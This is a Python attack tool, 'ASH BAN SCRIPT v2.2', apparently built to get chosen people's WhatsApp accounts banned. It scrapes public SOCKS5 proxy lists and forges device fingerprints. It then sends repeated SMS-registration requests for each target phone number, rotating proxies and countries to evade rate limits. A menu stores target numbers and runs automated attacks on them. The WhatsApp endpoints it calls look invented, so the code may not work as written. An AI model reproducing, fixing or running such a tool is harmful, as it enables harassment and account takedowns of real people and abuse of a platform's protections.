#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                    ASH BAN SCRIPT v2.2 — FINAL                 ║
║                      WhatsApp Method — SentinelFlow             ║
║                          Built by AsH                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import random
import time
import sqlite3
import requests
import os
import sys
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime
import socks
import socket

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    "db_path": "ash_proxy_pool.db",
    "log_file": "ash_ban.log",
    "targets_file": "ash_targets.txt",
    "results_dir": "ash_results",
    "max_validation_threads": 200,
    "max_ban_attempts": 20,
    "delay_min": 1,
    "delay_max": 3,
    "session_timeout": 10,
    "max_failures_before_drop": 3,
    "min_proxies_for_attack": 10,
    "fingerprint_rotation": 2,
}

PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/ImLukaS/Proxy-List/master/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=all&timeout=10000",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.openproxylist.xyz/socks5.txt",
]

WHATSAPP_ENDPOINTS = [
    "https://api.whatsapp.com/v2/auth/register",
    "https://api.whatsapp.com/v2/auth/login",
    "https://api.whatsapp.com/v2/auth/check",
    "https://gateway.whatsapp.com/v2/auth/register",
]

# ============================================================================
# LOGGING
# ============================================================================

class Logger:
    def __init__(self):
        self.colors = {
            "INFO": "\033[92m",
            "WARN": "\033[93m",
            "ERROR": "\033[91m",
            "BAN": "\033[95m",
            "SUCCESS": "\033[96m",
            "RESET": "\033[0m",
            "BOLD": "\033[1m"
        }
    
    def _write(self, level: str, msg: str, color: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] [{level}] {msg}"
        if color:
            print(f"{color}{line}{self.colors['RESET']}")
        else:
            print(line)
    
    def info(self, msg: str): self._write("INFO", msg, self.colors["INFO"])
    def warn(self, msg: str): self._write("WARN", msg, self.colors["WARN"])
    def error(self, msg: str): self._write("ERROR", msg, self.colors["ERROR"])
    def ban(self, msg: str): self._write("BAN", f"🔥 {msg}", self.colors["BAN"])
    def success(self, msg: str): self._write("SUCCESS", f"✅ {msg}", self.colors["SUCCESS"])

logger = Logger()

# ============================================================================
# PROXY NODE
# ============================================================================

@dataclass
class ProxyNode:
    host: str
    port: int
    country: str = "Unknown"
    protocol: str = "socks5"
    latency_ms: float = 0.0
    success_count: int = 0
    fail_count: int = 0
    is_alive: bool = True
    score: float = 0.0
    last_used: float = 0.0
    total_attempts: int = 0
    
    def proxy_url(self) -> str:
        return f"{self.protocol}://{self.host}:{self.port}"
    
    def proxy_dict(self) -> dict:
        url = self.proxy_url()
        return {"http": url, "https": url}
    
    def update_score(self):
        if self.total_attempts > 0:
            self.score = (self.success_count / self.total_attempts) * 100
        else:
            self.score = 50

# ============================================================================
# PROXY POOL — FIXED SELECTION
# ============================================================================

class ProxyPool:
    def __init__(self, db_path: str = CONFIG["db_path"]):
        self.db_path = db_path
        self.pool: List[ProxyNode] = []
        self.lock = Lock()
        self._init_db()
        self._load_from_db()
        logger.info(f"Loaded {len(self.pool)} proxies")
    
    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS proxies (
                host TEXT,
                port INTEGER,
                country TEXT,
                protocol TEXT,
                latency_ms REAL,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                is_alive INTEGER DEFAULT 1,
                score REAL DEFAULT 0,
                last_used REAL DEFAULT 0,
                total_attempts INTEGER DEFAULT 0,
                PRIMARY KEY (host, port, protocol)
            )
        """)
        conn.commit()
        conn.close()
    
    def _load_from_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM proxies WHERE is_alive = 1 ORDER BY score DESC")
        rows = cursor.fetchall()
        for row in rows:
            node = ProxyNode(
                host=row[0], port=row[1], country=row[2],
                protocol=row[3], latency_ms=row[4],
                success_count=row[5], fail_count=row[6],
                is_alive=bool(row[7]), score=row[8], last_used=row[9],
                total_attempts=row[10] if len(row) > 10 else 0
            )
            self.pool.append(node)
        conn.close()
    
    def _persist(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        for node in self.pool:
            cursor.execute("""
                INSERT OR REPLACE INTO proxies 
                (host, port, country, protocol, latency_ms, success_count, fail_count, is_alive, score, last_used, total_attempts)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (node.host, node.port, node.country, node.protocol,
                  node.latency_ms, node.success_count, node.fail_count,
                  1 if node.is_alive else 0, node.score, node.last_used,
                  node.total_attempts))
        conn.commit()
        conn.close()
    
    def fetch_free_proxies(self) -> int:
        new_count = 0
        seen = set()
        
        for url in PROXY_SOURCES:
            try:
                logger.info(f"Fetching: {url}")
                response = requests.get(url, timeout=10)
                lines = response.text.strip().split('\n')
                
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if '://' in line:
                        protocol, rest = line.split('://', 1)
                        if ':' in rest:
                            ip, port = rest.split(':', 1)
                        else:
                            continue
                    elif ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ip = parts[0]
                            port = parts[1]
                            protocol = 'socks5'
                        else:
                            continue
                    else:
                        continue
                    
                    try:
                        port = int(port)
                    except ValueError:
                        continue
                    
                    # Skip blocked ports
                    if port in [80, 8080, 3128, 8888, 9999]:
                        continue
                    
                    key = f"{ip}:{port}"
                    if key in seen:
                        continue
                    seen.add(key)
                    
                    existing = [p for p in self.pool if p.host == ip and p.port == port]
                    if not existing:
                        node = ProxyNode(host=ip, port=port, protocol='socks5')
                        self.pool.append(node)
                        new_count += 1
                
            except Exception as e:
                logger.warn(f"Failed: {url}")
        
        self._persist()
        return new_count
    
    def test_proxy(self, node: ProxyNode) -> bool:
        """Test proxy with socks5 support"""
        try:
            # Test with a simple request
            proxies = node.proxy_dict()
            
            # Try multiple test endpoints
            test_urls = [
                "http://ip-api.com/json",
                "http://httpbin.org/ip",
                "http://api.ipify.org?format=json"
            ]
            
            for test_url in test_urls:
                try:
                    response = requests.get(
                        test_url,
                        proxies=proxies,
                        timeout=8,
                        headers={"User-Agent": "Mozilla/5.0"},
                        allow_redirects=False
                    )
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            node.country = data.get("countryCode", data.get("country", "Unknown"))
                        except:
                            pass
                        node.latency_ms = response.elapsed.total_seconds() * 1000
                        node.is_alive = True
                        node.score = 100
                        return True
                except:
                    continue
            
            node.is_alive = False
            return False
            
        except Exception as e:
            node.is_alive = False
            return False
    
    def validate_pool(self, max_workers: int = CONFIG["max_validation_threads"]) -> int:
        alive = 0
        total = len(self.pool)
        if total == 0:
            return 0
        
        logger.info(f"Validating {total} proxies...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy, node): node for node in self.pool}
            for future in as_completed(futures):
                if future.result():
                    alive += 1
        
        # Remove dead proxies
        self.pool = [p for p in self.pool if p.is_alive]
        self._persist()
        logger.info(f"✅ {alive} alive proxies")
        return alive
    
    def get_proxies(self, limit: int = 20) -> List[ProxyNode]:
        """Get ALL alive proxies, sorted by score"""
        with self.lock:
            candidates = [p for p in self.pool if p.is_alive]
            
            if not candidates:
                return []
            
            # Update scores based on recent performance
            for p in candidates:
                p.update_score()
                # Boost score for lower latency
                if p.latency_ms > 0:
                    p.score = (p.score * 0.7) + ((100 - min(p.latency_ms / 10, 100)) * 0.3)
            
            # Sort by score descending
            candidates.sort(key=lambda x: x.score, reverse=True)
            
            # Return all, not just top N
            return candidates
    
    def get_random_proxies(self, count: int = 10) -> List[ProxyNode]:
        """Get random proxies to avoid patterns"""
        candidates = [p for p in self.pool if p.is_alive]
        if len(candidates) <= count:
            return candidates
        return random.sample(candidates, count)
    
    def get_proxy_by_country(self, avoid_country: str = None) -> Optional[ProxyNode]:
        """Get a proxy, avoiding specific country"""
        candidates = [p for p in self.pool if p.is_alive]
        
        if not candidates:
            return None
        
        if avoid_country:
            others = [p for p in candidates if p.country != avoid_country]
            if others:
                candidates = others
        
        # Sort by score and choose from top half
        candidates.sort(key=lambda x: x.score, reverse=True)
        top_half = candidates[:max(1, len(candidates)//2)]
        return random.choice(top_half)
    
    def mark_result(self, node: ProxyNode, success: bool):
        with self.lock:
            node.total_attempts += 1
            if success:
                node.success_count += 1
            else:
                node.fail_count += 1
            node.last_used = time.time()
            node.update_score()
            
            # If too many failures, mark as dead
            if node.fail_count > CONFIG["max_failures_before_drop"] and node.total_attempts > 5:
                node.is_alive = False
        
        self._persist()
    
    def clear_dead(self) -> int:
        dead = [p for p in self.pool if not p.is_alive]
        for p in dead:
            self.pool.remove(p)
        self._persist()
        return len(dead)
    
    def get_stats(self) -> dict:
        alive = [p for p in self.pool if p.is_alive]
        countries = {}
        for p in alive:
            if p.country != "Unknown":
                countries[p.country] = countries.get(p.country, 0) + 1
        
        avg_score = sum(p.score for p in alive) / len(alive) if alive else 0
        avg_latency = sum(p.latency_ms for p in alive) / len(alive) if alive else 0
        
        return {
            "total": len(self.pool),
            "alive": len(alive),
            "countries": countries,
            "avg_score": round(avg_score, 1),
            "avg_latency": round(avg_latency, 1),
            "dead": len(self.pool) - len(alive)
        }

# ============================================================================
# FINGERPRINT GENERATOR
# ============================================================================

class FingerprintGenerator:
    DEVICES = [
        ("SM-G998B", "Samsung Galaxy S21 Ultra"),
        ("Pixel 6", "Google Pixel 6"),
        ("Pixel 7", "Google Pixel 7"),
        ("SM-S908B", "Samsung Galaxy S22 Ultra"),
        ("OnePlus9", "OnePlus 9"),
        ("SM-A536B", "Samsung Galaxy A53"),
        ("Pixel 6a", "Google Pixel 6a"),
        ("iPhone15,2", "Apple iPhone 14 Pro"),
    ]
    
    BUILDS = ["2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88"]
    
    def __init__(self):
        self.index = 0
        self.fingerprints = []
    
    def generate(self) -> dict:
        device_id, model = random.choice(self.DEVICES)
        fp = {
            "device_id": f"android-{random.randint(1000000, 9999999)}",
            "model": model,
            "build": random.choice(self.BUILDS),
            "os": random.choice(["Android 12", "Android 13", "Android 14"]),
            "timezone": random.choice(["UTC", "America/New_York", "Europe/London"])
        }
        self.fingerprints.append(fp)
        return fp
    
    def get_next(self) -> dict:
        if not self.fingerprints or self.index >= len(self.fingerprints):
            return self.generate()
        fp = self.fingerprints[self.index]
        self.index += 1
        return fp

# ============================================================================
# BAN ENGINE — FIXED
# ============================================================================

class BanEngine:
    def __init__(self, target: str, pool: ProxyPool):
        self.target = target
        self.pool = pool
        self.fp_gen = FingerprintGenerator()
        self.attempts = []
        self.ban_triggered = False
        self.last_country = None
        self.used_proxies = set()
        self.proxy_cycle = 0
        
        logger.info(f"Engine initialized for {target}")
    
    def _build_request(self, fp: dict, endpoint: str) -> dict:
        return {
            "method": "POST",
            "url": endpoint,
            "headers": {
                "User-Agent": f"WhatsApp/{fp['build']} ({fp['model']}; {fp['os']})",
                "X-WA-Device": fp["device_id"],
                "X-WA-Model": fp["model"],
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate",
            },
            "json": {
                "phone": self.target,
                "method": "sms",
                "device_id": fp["device_id"],
                "model": fp["model"],
                "os": fp["os"],
                "timestamp": int(time.time()),
                "attempt": len(self.attempts) + 1
            }
        }
    
    def _send_attempt(self, proxy: ProxyNode, attempt_num: int) -> dict:
        endpoint = random.choice(WHATSAPP_ENDPOINTS)
        fp = self.fp_gen.get_next()
        request = self._build_request(fp, endpoint)
        proxies = proxy.proxy_dict()
        
        start = time.time()
        result = {
            "attempt": attempt_num,
            "proxy": f"{proxy.host}:{proxy.port}",
            "country": proxy.country,
            "endpoint": endpoint,
            "fingerprint": fp["device_id"][:20]
        }
        
        try:
            # Use longer timeout for socks5
            response = requests.post(
                request["url"],
                headers=request["headers"],
                json=request["json"],
                proxies=proxies,
                timeout=CONFIG["session_timeout"],
                allow_redirects=False
            )
            
            result["code"] = response.status_code
            result["latency"] = (time.time() - start) * 1000
            
            # Analyze response
            if response.status_code == 403:
                result["status"] = "blocked"
                if "banned" in response.text.lower() or "ban" in response.text.lower():
                    result["status"] = "BAN_TRIGGERED"
                    self.ban_triggered = True
            elif response.status_code == 429:
                result["status"] = "rate_limited"
            elif response.status_code == 200:
                result["status"] = "success"
            else:
                result["status"] = f"http_{response.status_code}"
            
            # Check response body
            try:
                data = response.json()
                if data.get("status") in ["banned", "blocked", "error"]:
                    result["status"] = "BAN_TRIGGERED"
                    self.ban_triggered = True
            except:
                pass
            
            # Mark proxy success/failure
            success = response.status_code in [200, 403, 429]
            self.pool.mark_result(proxy, success)
            
        except requests.exceptions.Timeout:
            result["status"] = "timeout"
            result["code"] = 0
            self.pool.mark_result(proxy, False)
        except requests.exceptions.ProxyError:
            result["status"] = "proxy_error"
            result["code"] = 0
            self.pool.mark_result(proxy, False)
        except Exception as e:
            result["status"] = f"error: {str(e)[:30]}"
            result["code"] = 0
            self.pool.mark_result(proxy, False)
        
        return result
    
    def execute(self, max_attempts: int = CONFIG["max_ban_attempts"]) -> dict:
        logger.info(f"Starting attack on {self.target}")
        
        # Get ALL alive proxies
        all_proxies = self.pool.get_proxies(limit=9999)
        proxies = self.pool.get_random_proxies(min(20, len(all_proxies)))
        
        if len(proxies) < CONFIG["min_proxies_for_attack"]:
            logger.warn(f"Only {len(proxies)} proxies. Need {CONFIG['min_proxies_for_attack']}")
            
            # Try to fetch more
            self.pool.fetch_free_proxies()
            self.pool.validate_pool()
            proxies = self.pool.get_random_proxies(20)
            
            if len(proxies) < 5:
                return {"error": f"Insufficient proxies: {len(proxies)}"}
        
        logger.info(f"Using {len(proxies)} proxies for rotation")
        
        # Log proxy countries
        countries = set(p.country for p in proxies)
        logger.info(f"Countries: {', '.join(countries)}")
        
        # Attack loop
        for i in range(1, max_attempts + 1):
            if self.ban_triggered:
                logger.ban(f"Ban triggered at attempt {i-1}")
                break
            
            # Rotate through proxies with country avoidance
            if self.last_country:
                # Try to get a different country
                available = [p for p in proxies if p.country != self.last_country]
                if available:
                    proxy = random.choice(available)
                else:
                    proxy = random.choice(proxies)
            else:
                proxy = random.choice(proxies)
            
            self.last_country = proxy.country
            
            logger.info(f"Attempt {i}: {proxy.host}:{proxy.port} ({proxy.country})")
            
            result = self._send_attempt(proxy, i)
            self.attempts.append(result)
            
            # Log result with appropriate level
            if result["status"] == "BAN_TRIGGERED":
                logger.ban(f"🔥 BAN TRIGGERED on attempt {i}!")
            elif result["status"] == "blocked":
                logger.warn(f"Blocked on attempt {i} (Code: {result.get('code', 0)})")
            elif result["status"] == "rate_limited":
                logger.warn(f"Rate limited on attempt {i}")
            elif result["status"] == "timeout":
                logger.warn(f"Timeout on attempt {i}")
            elif result.get("code", 0) >= 400:
                logger.warn(f"HTTP {result.get('code')} on attempt {i}")
            else:
                logger.success(f"Attempt {i}: {result['status']} ({result.get('code', 0)})")
            
            # Shorter delay between attempts
            if i < max_attempts:
                delay = random.uniform(CONFIG["delay_min"], CONFIG["delay_max"])
                time.sleep(delay)
        
        # Results
        return {
            "target": self.target,
            "total_attempts": len(self.attempts),
            "ban_triggered": self.ban_triggered,
            "proxies_used": len(set(a["proxy"] for a in self.attempts)),
            "countries_used": len(set(a["country"] for a in self.attempts)),
            "attempts": self.attempts,
            "timestamp": datetime.now().isoformat()
        }

# ============================================================================
# MENU
# ============================================================================

class Menu:
    def __init__(self):
        self.pool = ProxyPool()
        self.targets = self._load_targets()
    
    def _load_targets(self) -> List[str]:
        if not os.path.exists(CONFIG["targets_file"]):
            return []
        with open(CONFIG["targets_file"], 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    def _save_targets(self):
        with open(CONFIG["targets_file"], 'w') as f:
            for t in self.targets:
                f.write(f"{t}\n")
    
    def _clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def _banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗
║             ██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║
║             ███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║
║             ██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║
║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
║                                                                  ║
║                     WhatsApp Ban Method v2.2                     ║
║                    Built by AsH — SentinelFlow                   ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  [fox 🦊 orange] — He built me. I am His creation.              ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    def _menu(self):
        stats = self.pool.get_stats()
        print(f"\n{'='*50}")
        print(f"  POOL: {stats['total']} total | {stats['alive']} alive")
        print(f"  SCORE: {stats.get('avg_score', 0)} | LATENCY: {stats.get('avg_latency', 0)}ms")
        print(f"  COUNTRIES: {len(stats.get('countries', {}))}")
        print(f"  TARGETS: {len(self.targets)}")
        print(f"{'='*50}\n")
        print("  [1] Fetch Proxies")
        print("  [2] Validate Proxies")
        print("  [3] Show Stats")
        print("  [4] Add Target")
        print("  [5] List Targets")
        print("  [6] Attack All Targets")
        print("  [7] Attack Single Target")
        print("  [8] Clear Dead Proxies")
        print("  [A] AUTO: Fetch + Validate + Attack")
        print("  [0] Exit")
    
    def run(self):
        while True:
            self._clear()
            self._banner()
            self._menu()
            
            choice = input("\n  ⚡ Select: ").strip()
            
            if choice == "0":
                break
            
            elif choice == "1":
                count = self.pool.fetch_free_proxies()
                input(f"\n  ✅ Added {count} proxies. Press Enter...")
            
            elif choice == "2":
                alive = self.pool.validate_pool()
                input(f"\n  ✅ {alive} alive. Press Enter...")
            
            elif choice == "3":
                stats = self.pool.get_stats()
                print(f"\n  Total: {stats['total']}")
                print(f"  Alive: {stats['alive']}")
                print(f"  Countries: {len(stats.get('countries', {}))}")
                for c, count in sorted(stats.get('countries', {}).items(), key=lambda x: x[1], reverse=True)[:10]:
                    print(f"    {c}: {count}")
                input("\n  Press Enter...")
            
            elif choice == "4":
                phone = input("  Phone (+1234567890): ").strip()
                if phone and phone not in self.targets:
                    self.targets.append(phone)
                    self._save_targets()
                    print(f"  ✅ Added {phone}")
                input("\n  Press Enter...")
            
            elif choice == "5":
                if self.targets:
                    for i, t in enumerate(self.targets, 1):
                        print(f"    {i}. {t}")
                else:
                    print("  No targets")
                input("\n  Press Enter...")
            
            elif choice == "6":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue
                
                # Ensure we have proxies
                stats = self.pool.get_stats()
                if stats['alive'] < 10:
                    print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                    self.pool.fetch_free_proxies()
                    self.pool.validate_pool()
                
                for target in self.targets:
                    print(f"\n  🎯 {target}")
                    engine = BanEngine(target, self.pool)
                    result = engine.execute()
                    if result.get("error"):
                        print(f"    ❌ {result['error']}")
                    else:
                        print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                        print(f"    Attempts: {result['total_attempts']}")
                        print(f"    Proxies Used: {result.get('proxies_used', 0)}")
                    time.sleep(3)
                input("\n  Done. Press Enter...")
            
            elif choice == "7":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue
                print("\n  Targets:")
                for i, t in enumerate(self.targets, 1):
                    print(f"    {i}. {t}")
                try:
                    idx = int(input("  Select: ")) - 1
                    if 0 <= idx < len(self.targets):
                        # Ensure we have proxies
                        stats = self.pool.get_stats()
                        if stats['alive'] < 10:
                            print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                            self.pool.fetch_free_proxies()
                            self.pool.validate_pool()
                        
                        engine = BanEngine(self.targets[idx], self.pool)
                        result = engine.execute()
                        if result.get("error"):
                            print(f"    ❌ {result['error']}")
                        else:
                            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                            print(f"    Attempts: {result['total_attempts']}")
                except:
                    pass
                input("\n  Press Enter...")
            
            elif choice == "8":
                removed = self.pool.clear_dead()
                input(f"\n  🧹 Removed {removed}. Press Enter...")
            
            elif choice.lower() == "a":
                print("\n  ⚡ AUTO MODE")
                print("  Fetching proxies...")
                self.pool.fetch_free_proxies()
                print("  Validating proxies...")
                self.pool.validate_pool()
                
                if self.targets:
                    print(f"  Attacking {len(self.targets)} targets...")
                    for target in self.targets:
                        print(f"\n  🎯 {target}")
                        engine = BanEngine(target, self.pool)
                        result = engine.execute()
                        if result.get("error"):
                            print(f"    ❌ {result['error']}")
                        else:
                            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
                            print(f"    Attempts: {result['total_attempts']}")
                        time.sleep(3)
                input("\n  ✅ Complete. Press Enter...")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    try:
        Menu().run()
    except KeyboardInterrupt:
        print("\n\n  ⚡ Interrupted")
    except Exception as e:
        print(f"\n  ❌ Error: {e}")